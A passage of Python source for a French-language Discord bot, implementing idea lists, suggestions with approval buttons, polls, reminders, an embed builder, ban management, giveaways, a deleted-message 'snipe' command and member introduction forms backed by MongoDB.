            {"user_id": str(user_id)},
            {"$push": {"idees": idee}}  # Ajoute l'idée à la liste des idées existantes
        )
    else:
        # Si l'utilisateur n'a pas encore d'idées, on crée un nouveau document avec cette idée
        collection8.insert_one({
            "user_id": str(user_id),
            "idees": [idee]  # Crée une nouvelle liste d'idées avec l'idée ajoutée
        })
    
    embed = discord.Embed(title="Idée ajoutée !", description=f"**{idee}** a été enregistrée.", color=discord.Color.green())
    await interaction.response.send_message(embed=embed)

# Commande pour lister les idées
@bot.command(name="listi")
async def liste_idees(ctx):
    user_id = ctx.author.id
    
    # Chercher les idées de l'utilisateur dans la base de données
    idees_data = collection8.find_one({"user_id": str(user_id)})
    
    if not idees_data or not idees_data.get("idees"):
        embed = discord.Embed(title="Aucune idée enregistrée", description="Ajoute-en une avec /idées !", color=discord.Color.red())
    else:
        embed = discord.Embed(title="Tes idées", color=discord.Color.blue())
        for idx, idee in enumerate(idees_data["idees"], start=1):
            embed.add_field(name=f"Idée {idx}", value=idee, inline=False)
    
    await ctx.send(embed=embed)


# Commande pour supprimer une idée
@bot.tree.command(name="remove_idee", description="Supprime une de tes idées enregistrées")
async def remove_idee(interaction: discord.Interaction):
    user_id = interaction.user.id  # Utilisation de interaction.user.id pour obtenir l'ID utilisateur
    
    # Chercher les idées de l'utilisateur dans la base de données
    idees_data = collection8.find_one({"user_id": str(user_id)})
    
    if not idees_data or not idees_data.get("idees"):
        embed = discord.Embed(title="Aucune idée enregistrée", description="Ajoute-en une avec /idées !", color=discord.Color.red())
        await interaction.response.send_message(embed=embed)
        return

    idees = idees_data["idees"]

    # Créer un menu déroulant pour permettre à l'utilisateur de choisir une idée à supprimer
    options = [discord.SelectOption(label=f"Idée {idx+1}: {idee}", value=str(idx)) for idx, idee in enumerate(idees)]
    
    select = Select(placeholder="Choisis une idée à supprimer", options=options)
    
    # Définir l'interaction pour supprimer l'idée
    async def select_callback(interaction: discord.Interaction):
        selected_idee_index = int(select.values[0])
        idee_a_supprimer = idees[selected_idee_index]
        
        # Supprimer l'idée sélectionnée de la base de données
        collection8.update_one(
            {"user_id": str(user_id)},
            {"$pull": {"idees": idee_a_supprimer}}  # Supprime l'idée de la liste
        )
        
        embed = discord.Embed(
            title="Idée supprimée !",
            description=f"L'idée **{idee_a_supprimer}** a été supprimée.",
            color=discord.Color.green()
        )
        await interaction.response.send_message(embed=embed)

    select.callback = select_callback

    view = View()
    view.add_item(select)
    
    embed = discord.Embed(
        title="Choisis l'idée à supprimer",
        description="Sélectionne une idée à supprimer dans le menu déroulant.",
        color=discord.Color.orange()
    )
    
    await interaction.response.send_message(embed=embed, view=view)

#--------------------------------------------------------------------------------------------
# --- Classe du formulaire de suggestion ---
class SuggestionModal(Modal):
    def __init__(self):
        super().__init__(title="💡 Nouvelle Suggestion")

        self.suggestion_input = TextInput(
            label="Entrez votre suggestion",
            style=discord.TextStyle.paragraph,
            placeholder="Écrivez ici...",
            required=True,
            max_length=1000
        )
        self.add_item(self.suggestion_input)

    async def on_submit(self, interaction: discord.Interaction):
        guild_id = str(interaction.guild.id)
        data = collection20.find_one({"guild_id": guild_id})

        if not data or "suggestion_channel_id" not in data or "suggestion_role_id" not in data:
            return await interaction.response.send_message("❌ Le salon ou le rôle des suggestions n'a pas été configuré.", ephemeral=True)

        channel = interaction.client.get_channel(int(data["suggestion_channel_id"]))
        role = interaction.guild.get_role(int(data["suggestion_role_id"]))

        if not channel or not role:
            return await interaction.response.send_message("❌ Impossible de trouver le salon ou le rôle configuré.", ephemeral=True)

        embed = discord.Embed(
            title="💡 Nouvelle Suggestion",
            description=self.suggestion_input.value,
            color=discord.Color.green()
        )
        embed.set_footer(text=f"Suggéré par {interaction.user.display_name}", icon_url=interaction.user.avatar.url)

        sent_message = await channel.send(
            content=f"{role.mention} 🚀 Une nouvelle suggestion a été soumise !",
            embed=embed
        )

        await sent_message.edit(view=SuggestionView(message_id=sent_message.id))

        await interaction.response.send_message("✅ Votre suggestion a été envoyée avec succès !", ephemeral=True)

# --- Classe du formulaire de commentaire ---
class CommentModal(Modal):
    def __init__(self, original_message_id: int):
        super().__init__(title="💬 Commenter une suggestion")
        self.message_id = original_message_id

        self.comment_input = TextInput(
            label="Votre commentaire",
            placeholder="Exprimez votre avis ou amélioration...",
            style=discord.TextStyle.paragraph,
            max_length=500
        )
        self.add_item(self.comment_input)

    async def on_submit(self, interaction: discord.Interaction):
        guild_id = str(interaction.guild.id)
        data = collection20.find_one({"guild_id": guild_id})

        if not data or "suggestion_channel_id" not in data:
            return await interaction.response.send_message("❌ Le salon de suggestion est mal configuré.", ephemeral=True)

        channel = interaction.client.get_channel(int(data["suggestion_channel_id"]))
        if not channel:
            return await interaction.response.send_message("❌ Le salon de suggestion est introuvable.", ephemeral=True)

        comment_embed = discord.Embed(
            title="🗨️ Nouveau commentaire sur une suggestion",
            description=self.comment_input.value,
            color=discord.Color.blurple()
        )
        comment_embed.set_footer(text=f"Par {interaction.user.display_name}", icon_url=interaction.user.avatar.url)

        await channel.send(content=f"📝 Commentaire sur la suggestion ID `{self.message_id}` :", embed=comment_embed)
        await interaction.response.send_message("✅ Commentaire envoyé avec succès !", ephemeral=True)

# --- Vue avec les boutons ---
class SuggestionView(View):
    def __init__(self, message_id: int):
        super().__init__(timeout=None)
        self.message_id = message_id

        self.add_item(Button(label="✅ Approuver", style=discord.ButtonStyle.green, custom_id="suggestion_approve"))
        self.add_item(Button(label="❌ Refuser", style=discord.ButtonStyle.red, custom_id="suggestion_decline"))
        self.add_item(Button(label="💬 Commenter", style=discord.ButtonStyle.blurple, custom_id=f"suggestion_comment:{message_id}"))

# --- Interaction avec les boutons ---
@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type == discord.InteractionType.component:
        custom_id = interaction.data.get("custom_id")

        if custom_id == "suggestion_approve":
            await interaction.response.send_message("✅ Suggestion approuvée !", ephemeral=True)
        elif custom_id == "suggestion_decline":
            await interaction.response.send_message("❌ Suggestion refusée.", ephemeral=True)
        elif custom_id.startswith("suggestion_comment:"):
            try:
                message_id = int(custom_id.split(":")[1])
                await interaction.response.send_modal(CommentModal(original_message_id=message_id))
            except Exception:
                await interaction.response.send_message("❌ Erreur lors de l'ouverture du commentaire.", ephemeral=True)

# --- Commande /suggestion pour envoyer une suggestion ---
@bot.tree.command(name="suggestion", description="💡 Envoie une suggestion pour le serveur")
async def suggest(interaction: discord.Interaction):
    guild_id = str(interaction.guild.id)
    data = collection20.find_one({"guild_id": guild_id})

    if not data or "suggestion_channel_id" not in data or "suggestion_role_id" not in data:
        return await interaction.response.send_message("❌ Le système de suggestion n'est pas encore configuré.", ephemeral=True)

    await interaction.response.send_modal(SuggestionModal())

# --- Commande /set_suggestion pour configurer le salon + rôle ---
@bot.tree.command(name="set_suggestion", description="📝 Définir le salon et rôle pour les suggestions")
@app_commands.describe(channel="Salon pour recevoir les suggestions", role="Rôle à ping lors des suggestions")
async def set_suggestion(interaction: discord.Interaction, channel: discord.TextChannel, role: discord.Role):
    if not interaction.user.guild_permissions.administrator:
        return await interaction.response.send_message("❌ Tu n'as pas les permissions nécessaires.", ephemeral=True)

    guild_id = str(interaction.guild.id)

    collection20.update_one(
        {"guild_id": guild_id},
        {"$set": {
            "suggestion_channel_id": str(channel.id),
            "suggestion_role_id": str(role.id)
        }},
        upsert=True
    )

    await interaction.response.send_message(
        f"✅ Le système de suggestions est maintenant configuré avec {channel.mention} et {role.mention}.",
        ephemeral=True
    )
#-------------------------------------------------------------------------------- Sondage: /sondage

# Dictionnaire global pour les cooldowns des sondages
user_cooldown = {}

# Classe du Modal pour créer un sondage
class PollModal(discord.ui.Modal, title="📊 Créer un sondage interactif"):
    def __init__(self):
        super().__init__()

        self.question = discord.ui.TextInput(
            label="💬 Question principale",
            placeholder="Ex : Quel est votre fruit préféré ?",
            max_length=200,
            style=discord.TextStyle.paragraph
        )
        self.options = discord.ui.TextInput(
            label="🧩 Choix possibles (séparés par des virgules)",
            placeholder="Ex : 🍎 Pomme, 🍌 Banane, 🍇 Raisin, 🍍 Ananas",
            max_length=300
        )

        self.add_item(self.question)
        self.add_item(self.options)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = interaction.user.id

        # Cooldown de 60s
        if user_id in user_cooldown and time.time() - user_cooldown[user_id] < 60:
            return await interaction.response.send_message(
                "⏳ Vous devez attendre **60 secondes** avant de créer un nouveau sondage.",
                ephemeral=True
            )

        user_cooldown[user_id] = time.time()

        question = self.question.value
        options_raw = self.options.value
        options = [opt.strip() for opt in options_raw.split(",") if opt.strip()]

        if len(options) < 2 or len(options) > 10:
            return await interaction.response.send_message(
                "❗ Veuillez entrer **entre 2 et 10 choix** maximum pour votre sondage.",
                ephemeral=True
            )

        # Génération de l'embed
        embed = discord.Embed(
            title="📢 Nouveau sondage disponible !",
            description=(
                f"🧠 **Question** :\n> *{question}*\n\n"
                f"🎯 **Choix proposés** :\n" +
                "\n".join([f"{chr(0x1F1E6 + i)} ┇ {opt}" for i, opt in enumerate(options)])
            ),
            color=discord.Color.teal()
        )
        embed.set_author(
            name=interaction.user.display_name,
            icon_url=interaction.user.display_avatar.url
        )
        embed.set_thumbnail(url="https://cdn-icons-png.flaticon.com/512/4140/4140047.png")
        embed.set_footer(text="Réagissez ci-dessous pour voter 🗳️")
        embed.timestamp = discord.utils.utcnow()

        message = await interaction.channel.send(embed=embed)

        # Ajout des réactions 🇦, 🇧, ...
        for i in range(len(options)):
            await message.add_reaction(chr(0x1F1E6 + i))

        await interaction.response.send_message("✅ Votre sondage a été publié avec succès !", ephemeral=True)

# Commande slash /sondage
@bot.tree.command(name="sondage", description="📊 Créez un sondage stylé avec des choix")
async def sondage(interaction: discord.Interaction):
    await interaction.response.send_modal(PollModal())

#-------------------------------------------------------------------------------- Rappel: /rappel

# Commande de rappel
@bot.tree.command(name="rappel", description="Définis un rappel avec une durée, une raison et un mode d'alerte.")
@app_commands.describe(
    duree="Durée du rappel (format: nombre suivi de 's', 'm', 'h' ou 'd')",
    raison="Pourquoi veux-tu ce rappel ?",
    mode="Où voulez-vous que je vous rappelle ceci ?"
)
@app_commands.choices(
    mode=[
        app_commands.Choice(name="Message Privé", value="prive"),
        app_commands.Choice(name="Salon", value="salon")
    ]
)
async def rappel(interaction: discord.Interaction, duree: str, raison: str, mode: app_commands.Choice[str]):
    # Vérification du format de durée
    if not duree[:-1].isdigit() or duree[-1] not in "smhd":
        await interaction.response.send_message(
            "Format de durée invalide. Utilisez un nombre suivi de 's' (secondes), 'm' (minutes), 'h' (heures) ou 'd' (jours).",
            ephemeral=True
        )
        return
    
    # Parsing de la durée
    time_value = int(duree[:-1])  # Extrait le nombre
    time_unit = duree[-1]  # Extrait l'unité de temps
    
    # Convertir la durée en secondes
    conversion = {'s': 1, 'm': 60, 'h': 3600, 'd': 86400}
    total_seconds = time_value * conversion[time_unit]
    
    # Limiter la durée du rappel (max 7 jours pour éviter les abus)
    max_seconds = 7 * 86400  # 7 jours
    if total_seconds > max_seconds:
        await interaction.response.send_message(
            "La durée du rappel ne peut pas dépasser 7 jours (604800 secondes).",
            ephemeral=True
        )
        return
    
    # Confirmation du rappel
    embed = discord.Embed(
        title="🔔 Rappel programmé !",
        description=f"**Raison :** {raison}\n**Durée :** {str(timedelta(seconds=total_seconds))}\n**Mode :** {mode.name}",
        color=discord.Color.blue()
    )
    embed.set_footer(text="Je te rappellerai à temps ⏳")
    await interaction.response.send_message(embed=embed, ephemeral=True)
    
    # Attendre le temps indiqué
    await asyncio.sleep(total_seconds)
    
    # Création du rappel
    rappel_embed = discord.Embed(
        title="⏰ Rappel !",
        description=f"**Raison :** {raison}\n\n⏳ Temps écoulé : {str(timedelta(seconds=total_seconds))}",
        color=discord.Color.green()
    )
    rappel_embed.set_footer(text="Pense à ne pas oublier ! 😉")
    
    # Envoi en MP ou dans le salon
    if mode.value == "prive":
        try:
            await interaction.user.send(embed=rappel_embed)
        except discord.Forbidden:
            await interaction.followup.send(
                "Je n'ai pas pu t'envoyer le message en privé. Veuillez vérifier vos paramètres de confidentialité.",
                ephemeral=True
            )
    else:
        await interaction.channel.send(f"{interaction.user.mention}", embed=rappel_embed)

THUMBNAIL_URL = "https://github.com/Iseyg91/Etherya/blob/main/3e3bd3c24e33325c7088f43c1ae0fadc.png?raw=true"

# Fonction pour vérifier si une URL est valide
def is_valid_url(url):
    regex = re.compile(
        r'^(https?://)?'  # http:// ou https:// (optionnel)
        r'([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}'  # domaine
        r'(/.*)?$'  # chemin (optionnel)
    )
    return bool(re.match(regex, url))

class EmbedBuilderView(discord.ui.View):
    def __init__(self, author: discord.User, channel: discord.TextChannel):
        super().__init__(timeout=180)
        self.author = author
        self.channel = channel
        self.embed = discord.Embed(title="Titre", description="Description", color=discord.Color.blue())
        self.embed.set_thumbnail(url=THUMBNAIL_URL)
        self.second_image_url = None
        self.message = None  # Stocke le message contenant l'embed

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user != self.author:
            await interaction.response.send_message("❌ Vous ne pouvez pas modifier cet embed.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="Modifier le titre", style=discord.ButtonStyle.primary)
    async def edit_title(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(EmbedTitleModal(self))

    @discord.ui.button(label="Modifier la description", style=discord.ButtonStyle.primary)
    async def edit_description(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(EmbedDescriptionModal(self))

    @discord.ui.button(label="Changer la couleur", style=discord.ButtonStyle.primary)
    async def edit_color(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.embed.color = discord.Color.random()
        if self.message:
            await self.message.edit(embed=self.embed, view=self)
        else:
            await interaction.response.send_message("Erreur : impossible de modifier le message.", ephemeral=True)

    @discord.ui.button(label="Ajouter une image", style=discord.ButtonStyle.secondary)
    async def add_image(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(EmbedImageModal(self))

    @discord.ui.button(label="Ajouter 2ème image", style=discord.ButtonStyle.secondary)
    async def add_second_image(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(EmbedSecondImageModal(self))

    @discord.ui.button(label="Envoyer", style=discord.ButtonStyle.success)
    async def send_embed(self, interaction: discord.Interaction, button: discord.ui.Button):
        embeds = [self.embed]
        if self.second_image_url:
            second_embed = discord.Embed(color=self.embed.color)
            second_embed.set_image(url=self.second_image_url)
            embeds.append(second_embed)

        await self.channel.send(embeds=embeds)
        await interaction.response.send_message("✅ Embed envoyé !", ephemeral=True)

class EmbedTitleModal(discord.ui.Modal):
    def __init__(self, view: EmbedBuilderView):
        super().__init__(title="Modifier le Titre")
        self.view = view
        self.title_input = discord.ui.TextInput(label="Nouveau Titre", required=True)
        self.add_item(self.title_input)

    async def on_submit(self, interaction: discord.Interaction):
        self.view.embed.title = self.title_input.value
        if self.view.message:
            await self.view.message.edit(embed=self.view.embed, view=self.view)
        else:
            await interaction.response.send_message("Erreur : impossible de modifier le message.", ephemeral=True)

class EmbedDescriptionModal(discord.ui.Modal):
    def __init__(self, view: EmbedBuilderView):
        super().__init__(title="Modifier la description")
        self.view = view
        self.description = discord.ui.TextInput(label="Nouvelle description", style=discord.TextStyle.paragraph, max_length=4000)
        self.add_item(self.description)

    async def on_submit(self, interaction: discord.Interaction):
        self.view.embed.description = self.description.value
        if self.view.message:
            await self.view.message.edit(embed=self.view.embed, view=self.view)
        else:
            await interaction.response.send_message("Erreur : impossible de modifier le message.", ephemeral=True)

class EmbedImageModal(discord.ui.Modal):
    def __init__(self, view: EmbedBuilderView):
        super().__init__(title="Ajouter une image")
        self.view = view
        self.image_input = discord.ui.TextInput(label="URL de l'image", required=True)
        self.add_item(self.image_input)

    async def on_submit(self, interaction: discord.Interaction):
        if is_valid_url(self.image_input.value):
            self.view.embed.set_image(url=self.image_input.value)
            await self.view.message.edit(embed=self.view.embed, view=self.view)
        else:
            await interaction.response.send_message("❌ URL invalide.", ephemeral=True)

class EmbedSecondImageModal(discord.ui.Modal):
    def __init__(self, view: EmbedBuilderView):
        super().__init__(title="Ajouter une 2ème image")
        self.view = view
        self.second_image_input = discord.ui.TextInput(label="URL de la 2ème image", required=True)
        self.add_item(self.second_image_input)

    async def on_submit(self, interaction: discord.Interaction):
        if is_valid_url(self.second_image_input.value):
            self.view.second_image_url = self.second_image_input.value
        else:
            await interaction.response.send_message("❌ URL invalide.", ephemeral=True)

@bot.tree.command(name="embed", description="Créer un embed personnalisé")
async def embed_builder(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    admin_role_id = 792755123587645461  # ID du rôle admin
    if not any(role.id == admin_role_id or role.permissions.administrator for role in interaction.user.roles):
        return await interaction.response.send_message("❌ Vous n'avez pas la permission d'utiliser cette commande.", ephemeral=True)

    view = EmbedBuilderView(interaction.user, interaction.channel)
    response = await interaction.followup.send(embed=view.embed, view=view, ephemeral=True)
    view.message = response

async def is_admin(ctx):
    return ctx.author.guild_permissions.administrator

@bot.command()
@commands.check(is_admin)
async def listban(ctx):
    bans = [ban async for ban in ctx.guild.bans()]

    if not bans:
        embed = discord.Embed(
            title="📜 Liste des bannis",
            description="✅ Aucun utilisateur n'est actuellement banni du serveur.",
            color=discord.Color.green()
        )
        embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else discord.Embed.Empty)
        return await ctx.send(embed=embed)

    pages = []
    content = ""

    for i, ban in enumerate(bans, 1):
        user = ban.user
        reason = ban.reason or "Aucune raison spécifiée"
        entry = f"🔹 **{user.name}#{user.discriminator}**\n📝 *{reason}*\n\n"

        if len(content + entry) > 1000:  # pour laisser de la marge avec la limite d'embed
            pages.append(content)
            content = ""
        content += entry

    if content:
        pages.append(content)

    for idx, page in enumerate(pages, 1):
        embed = discord.Embed(
            title=f"📜 Liste des bannis (Page {idx}/{len(pages)})",
            description=page,
            color=discord.Color.red()
        )
        embed.set_footer(text=f"Total : {len(bans)} utilisateur(s) banni(s)")
        if ctx.guild.icon:
            embed.set_thumbnail(url=ctx.guild.icon.url)
        await ctx.send(embed=embed)

@bot.command(name="unbanall")
@commands.check(is_admin)
async def unbanall(ctx):
    async for ban_entry in ctx.guild.bans():
        await ctx.guild.unban(ban_entry.user)
    await ctx.send("✅ Tous les utilisateurs bannis ont été débannis !")

giveaways = {}  # Stocke les participants

class GiveawayView(discord.ui.View):
    def __init__(self, ctx):
        super().__init__(timeout=180)
        self.ctx = ctx
        self.prize = " !!Giveaway !!"
        self.duration = 60  # En secondes
        self.duration_text = "60 secondes"
        self.emoji = "🎉"
        self.winners = 1
        self.channel = ctx.channel
        self.message = None  # Pour stocker l'embed message

    async def update_embed(self):
        """ Met à jour l'embed avec les nouvelles informations. """
        embed = discord.Embed(
            title="🎉 **Création d'un Giveaway**",
            description=f"🎁 **Gain:** {self.prize}\n"
                        f"⏳ **Durée:** {self.duration_text}\n"
                        f"🏆 **Gagnants:** {self.winners}\n"
                        f"📍 **Salon:** {self.channel.mention}",
            color=discord.Color.blurple()  # Utilisation d'une couleur bleue sympathique
        )
        embed.set_footer(text="Choisissez les options dans le menu déroulant ci-dessous.")
        embed.set_thumbnail(url="https://github.com/Iseyg91/Etherya-Gestion/blob/main/t%C3%A9l%C3%A9chargement%20(9).png?raw=true")  # Logo ou icône du giveaway

        if self.message:
            await self.message.edit(embed=embed, view=self)

    async def parse_duration(self, text):
        """ Convertit un texte en secondes et retourne un affichage formaté. """
        duration_seconds = 0
        match = re.findall(r"(\d+)\s*(s|sec|m|min|h|hr|heure|d|jour|jours)", text, re.IGNORECASE)

        if not match:
            return None, None

        duration_text = []
        for value, unit in match:
            value = int(value)
            if unit in ["s", "sec"]:
                duration_seconds += value
                duration_text.append(f"{value} seconde{'s' if value > 1 else ''}")
            elif unit in ["m", "min"]:
                duration_seconds += value * 60
                duration_text.append(f"{value} minute{'s' if value > 1 else ''}")
            elif unit in ["h", "hr", "heure"]:
                duration_seconds += value * 3600
                duration_text.append(f"{value} heure{'s' if value > 1 else ''}")
            elif unit in ["d", "jour", "jours"]:
                duration_seconds += value * 86400
                duration_text.append(f"{value} jour{'s' if value > 1 else ''}")

        return duration_seconds, " ".join(duration_text)

    async def wait_for_response(self, interaction, prompt, parse_func=None):
        """ Attend une réponse utilisateur avec une conversion de type si nécessaire. """
        await interaction.response.send_message(prompt, ephemeral=True)
        try:
            msg = await bot.wait_for("message", check=lambda m: m.author == interaction.user, timeout=30)
            return await parse_func(msg.content) if parse_func else msg.content
        except asyncio.TimeoutError:
            await interaction.followup.send("⏳ Temps écoulé. Réessayez.", ephemeral=True)
            return None

    @discord.ui.select(
        placeholder="Choisir un paramètre",
        options=[
            discord.SelectOption(label="🎁 Modifier le gain", value="edit_prize"),
            discord.SelectOption(label="⏳ Modifier la durée", value="edit_duration"),
            discord.SelectOption(label="🏆 Modifier le nombre de gagnants", value="edit_winners"),
            discord.SelectOption(label="💬 Modifier le salon", value="edit_channel"),
            discord.SelectOption(label="🚀 Envoyer le giveaway", value="send_giveaway"),
        ]
    )
    async def select_action(self, interaction: discord.Interaction, select: discord.ui.Select):
        value = select.values[0]

        if value == "edit_prize":
            response = await self.wait_for_response(interaction, "Quel est le gain du giveaway ?", str)
            if response:
                self.prize = response
                await self.update_embed()
        elif value == "edit_duration":
            response = await self.wait_for_response(interaction, 
                "Durée du giveaway ? (ex: 10min, 2h, 1jour)", self.parse_duration)
            if response and response[0] > 0:
                self.duration, self.duration_text = response
                await self.update_embed()
        elif value == "edit_winners":
            response = await self.wait_for_response(interaction, "Combien de gagnants ?", lambda x: int(x))
            if response and response > 0:
                self.winners = response
                await self.update_embed()
        elif value == "edit_channel":
            await interaction.response.send_message("Mentionne le salon du giveaway.", ephemeral=True)
            msg = await bot.wait_for("message", check=lambda m: m.author == interaction.user, timeout=30)
            if msg.channel_mentions:
                self.channel = msg.channel_mentions[0]
                await self.update_embed()
            else:
                await interaction.followup.send("Aucun salon mentionné.", ephemeral=True)
        elif value == "send_giveaway":
            embed = discord.Embed(
                title="🎉 Giveaway !",
                description=f"🎁 **Gain:** {self.prize}\n"
                            f"⏳ **Durée:** {self.duration_text}\n"
                            f"🏆 **Gagnants:** {self.winners}\n"
                            f"📍 **Salon:** {self.channel.mention}\n\n"
                            f"Réagis avec {self.emoji} pour participer !",
                color=discord.Color.green()  # Utilisation d'une couleur de succès pour l'envoi
            )
            embed.set_footer(text="Bonne chance à tous les participants ! 🎉")
            embed.set_thumbnail(url="https://github.com/Iseyg91/Etherya-Gestion/blob/main/t%C3%A9l%C3%A9chargement%20(8).png?raw=true")  # Logo ou icône du giveaway

            message = await self.channel.send(embed=embed)
            await message.add_reaction(self.emoji)

            giveaways[message.id] = {
                "prize": self.prize,
                "winners": self.winners,
                "emoji": self.emoji,
                "participants": []
            }

            await interaction.response.send_message(f"🎉 Giveaway envoyé dans {self.channel.mention} !", ephemeral=True)

            await asyncio.sleep(self.duration)
            await self.end_giveaway(message)

    async def end_giveaway(self, message):
        data = giveaways.get(message.id)
        if not data:
            return

        participants = data["participants"]
        if len(participants) < 1:
            await message.channel.send("🚫 Pas assez de participants, giveaway annulé.")
            return

        winners = random.sample(participants, min(data["winners"], len(participants)))
        winners_mentions = ", ".join(winner.mention for winner in winners)

        embed = discord.Embed(
            title="🏆 Giveaway Terminé !",
            description=f"🎁 **Gain:** {data['prize']}\n"
                        f"🏆 **Gagnants:** {winners_mentions}\n\n"
                        f"Merci d'avoir participé !",
            color=discord.Color.green()
        )
        embed.set_footer(text="Merci à tous ! 🎉")
        embed.set_thumbnail(url="https://github.com/Iseyg91/Etherya-Gestion/blob/main/t%C3%A9l%C3%A9chargement%20(7).png?raw=true")  # Icône ou logo de fin de giveaway

        await message.channel.send(embed=embed)
        del giveaways[message.id]


@bot.event
async def on_reaction_add(reaction, user):
    if user.bot:
        return

    message_id = reaction.message.id
    if message_id in giveaways and str(reaction.emoji) == giveaways[message_id]["emoji"]:
        if user not in giveaways[message_id]["participants"]:
            giveaways[message_id]["participants"].append(user)


@bot.command()
async def gcreate(ctx):
    view = GiveawayView(ctx)
    embed = discord.Embed(
        title="🎉 **Création d'un Giveaway**",
        description="Utilise le menu déroulant ci-dessous pour configurer ton giveaway.\n\n"
                    "🎁 **Gain:** Un cadeau mystère\n"
                    "⏳ **Durée:** 60 secondes\n"
                    "🏆 **Gagnants:** 1\n"
                    f"📍 **Salon:** {ctx.channel.mention}",
        color=discord.Color.blurple()  # Couleur de l'embed plus attractive
    )
    embed.set_footer(text="Choisis les options dans le menu déroulant ci-dessous.")
    embed.set_thumbnail(url="https://github.com/Iseyg91/Etherya-Gestion/blob/main/t%C3%A9l%C3%A9chargement%20(6).png?raw=true")  # Icône ou logo du giveaway

    view.message = await ctx.send(embed=embed, view=view)
    
@bot.command()
async def alladmin(ctx):
    """Affiche la liste des administrateurs avec un joli embed"""
    admins = [member for member in ctx.guild.members if member.guild_permissions.administrator]

    if not admins:
        embed = discord.Embed(
            title="❌ Aucun administrateur trouvé",
            description="Il semble que personne n'ait les permissions d'administrateur sur ce serveur.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    # Création d'un embed stylé
    embed = discord.Embed(
        title="📜 Liste des administrateurs",
        description=f"Voici les {len(admins)} administrateurs du serveur **{ctx.guild.name}** :",
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
    embed.set_footer(text=f"Commande demandée par {ctx.author.name}", icon_url=ctx.author.avatar.url)

    for admin in admins:
        embed.add_field(name=f"👤 {admin.name}#{admin.discriminator}", value=f"ID : `{admin.id}`", inline=False)

    await ctx.send(embed=embed)

# Dictionnaire pour stocker les messages supprimés {channel_id: deque[(timestamp, auteur, contenu)]}
sniped_messages = {}

@bot.command()
async def snipe(ctx, index: int = 1):
    channel_id = ctx.channel.id
    
    if channel_id not in sniped_messages or len(sniped_messages[channel_id]) == 0:
        await ctx.send("Aucun message récent supprimé trouvé !")
        return

    if not (1 <= index <= len(sniped_messages[channel_id])):
        await ctx.send(f"Il n'y a que {len(sniped_messages[channel_id])} messages enregistrés.")
        return

    timestamp, author, content = sniped_messages[channel_id][-index]
    embed = discord.Embed(
        title=f"Message supprimé de {author}",
        description=content,
        color=discord.Color.red(),
        timestamp=discord.utils.utcnow()
    )
    embed.set_footer(text=f"Demandé par {ctx.author}")

    await ctx.send(embed=embed)


class PresentationForm(discord.ui.Modal, title="📝 Faisons connaissance"):
    pseudo = TextInput(label="Ton pseudo", placeholder="Ex: Jean_57", required=True, max_length=50)
    age = TextInput(label="Ton âge", placeholder="Ex: 18", required=True, max_length=3)
    passion = TextInput(label="Ta passion principale", placeholder="Ex: Gaming, Musique...", required=True, max_length=100)
    bio = TextInput(label="Une courte bio", placeholder="Parle un peu de toi...", style=discord.TextStyle.paragraph, required=True, max_length=300)
    reseaux = TextInput(label="Tes réseaux sociaux préférés", placeholder="Ex: Twitter, TikTok, Discord...", required=False, max_length=100)

    async def on_submit(self, interaction: discord.Interaction):
        # Récupérer les données du formulaire
        presentation_data = {
            'pseudo': self.pseudo.value,
            'age': self.age.value,
            'passion': self.passion.value,
            'bio': self.bio.value,
            'reseaux': self.reseaux.value,
        }

        # On envoie la présentation dans le salon
        guild_id = interaction.guild.id
        guild_settings = load_guild_settings(guild_id)
        presentation_channel_id = guild_settings.get('presentation', {}).get('presentation_channel')

        if presentation_channel_id:
            presentation_channel = interaction.guild.get_channel(presentation_channel_id)

            if presentation_channel:
                embed = discord.Embed(
                    title=f"📢 Nouvelle présentation de {interaction.user.display_name}",
                    description="Voici une nouvelle présentation ! 🎉",
                    color=discord.Color.blurple()
                )
                embed.set_thumbnail(url=interaction.user.display_avatar.url)
                embed.add_field(name="👤 Pseudo", value=presentation_data['pseudo'], inline=True)
                embed.add_field(name="🎂 Âge", value=presentation_data['age'], inline=True)
                embed.add_field(name="🎨 Passion", value=presentation_data['passion'], inline=False)
                if presentation_data['reseaux']:
                    embed.add_field(name="🌐 Réseaux sociaux", value=presentation_data['reseaux'], inline=False)
                embed.add_field(name="📝 Bio", value=presentation_data['bio'], inline=False)
                embed.set_footer(text=f"Utilisateur ID: {interaction.user.id}", icon_url=interaction.user.display_avatar.url)

                await presentation_channel.send(embed=embed)

                await interaction.response.send_message("Ta présentation a été envoyée ! 🎉", ephemeral=True)
            else:
                await interaction.response.send_message("Le salon de présentation n'existe plus ou est invalide.", ephemeral=True)
        else:
            await interaction.response.send_message("Le salon de présentation n'a pas été configuré pour ce serveur.", ephemeral=True)

# --- Commande Slash ---
@bot.tree.command(name="presentation", description="Remplis un formulaire pour te présenter à la communauté !")
async def presentation(interaction: discord.Interaction):
    guild_id = interaction.guild.id
    guild_settings = load_guild_settings(guild_id)
    presentation_channel_id = guild_settings.get('presentation', {}).get('presentation_channel')

    if presentation_channel_id:
        try:
            await interaction.response.send_modal(PresentationForm())  # Envoie un seul modal
        except discord.errors.HTTPException as e:
            print(f"Erreur lors de l'envoi du modal : {e}")
            await interaction.response.send_message("❌ Une erreur est survenue lors de l'envoi du formulaire. Veuillez réessayer.", ephemeral=True)
    else:
        await interaction.response.send_message(
            "⚠️ Le salon de présentation n’a pas été configuré sur ce serveur. Veuillez contacter un administrateur.",
            ephemeral=True
        )

# Commande pour définir le salon de présentation
@bot.tree.command(name="set_presentation", description="Définit le salon où les présentations seront envoyées (admin uniquement)")
@app_commands.checks.has_permissions(administrator=True)
async def set_presentation(interaction: discord.Interaction, salon: discord.TextChannel):
    guild_id = interaction.guild.id
    channel_id = salon.id

    # Mise à jour ou insertion dans la collection21
    collection21.update_one(
        {"guild_id": guild_id},
